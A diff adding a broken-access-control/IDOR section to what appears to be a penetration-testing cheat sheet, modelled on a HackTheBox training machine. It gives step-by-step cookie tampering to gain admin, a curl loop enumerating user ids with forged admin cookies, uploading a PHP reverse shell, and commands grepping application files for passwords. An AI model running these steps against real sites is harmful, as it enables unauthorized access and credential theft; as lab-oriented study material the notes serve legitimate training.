@@ -59,6 +59,25 @@ sqlmap -u "http://target/item.php?id=1" --batch --dbs
 # Upload bypass: double ext (.php.jpg), null byte, magic-byte + .phtml/.phar
 ```
 
+## Broken access control / IDOR (HTB Oopsie pattern)
+Hidden login panels (scryer flags these from asset paths, e.g. `/cdn-cgi/login/`):
+```
+1. Try default creds; look for a "Login as guest" option -> guest session.
+2. Note the session cookies (role=guest, user=2233) in devtools.
+3. IDOR: increment an ?id= / ?content=accounts&id=N param to enumerate users
+   and disclose the admin's access id + role.
+4. Tamper the cookies (user=<admin id>, role=admin) -> reach admin-only pages
+   (e.g. an upload form).
+5. Upload a PHP reverse shell -> browse /uploads/shell.php -> shell.
+```
+```bash
+# id enumeration:
+for i in $(seq 1 50); do echo "== $i"; curl -s -b 'user=1;role=admin' \
+  "http://target/cdn-cgi/login/admin.php?content=accounts&id=$i" | grep -Eo 'Access ID|@'; done
+# after a shell, creds usually live in the app's db.php:
+cat /var/www/html/**/db.php ; cat * | grep -i passw
+```
+
 ## CMS-specific
 ```bash
 wpscan --url http://target/ --enumerate u,vp,vt --api-token <t>   # WordPress
